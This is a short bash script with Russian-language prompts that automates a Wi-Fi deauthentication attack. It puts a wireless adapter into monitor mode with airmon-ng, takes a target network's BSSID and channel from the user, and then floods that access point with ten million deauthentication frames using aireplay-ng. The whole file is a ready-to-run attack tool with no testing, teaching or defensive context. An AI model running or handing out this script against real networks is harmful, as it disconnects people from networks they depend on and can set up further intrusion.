
#!/bin/bash

echo -e "\e[41mВведите название адаптера:\e[0m"
read DeviceName

echo -e "\e[41mВведите название адаптера + mon\e[0m"
read DeviceNameMon

echo -e "\e[41mОтключаем ненужные процессы...\e[0m"
sudo airmon-ng check kill

echo -e "\e[41mПеревод $DeviceName в режим мониторинга...\e[0m"
sudo airmon-ng start $DeviceName

echo -e "\e[41mВведите BSSID сети:\e[0m"
read BSSID

echo -e "\e[41mВведите канал сети:\e[0m"
read Channel

echo -e "\e[41mСмена канала...\e[0m"
sudo iwconfig $DeviceNameMon channel $Channel

echo -e "\e[41mЗапуск деаунтификатора...\e[0m"
sudo aireplay-ng --deauth 10000000 -a $BSSID $DeviceNameMon
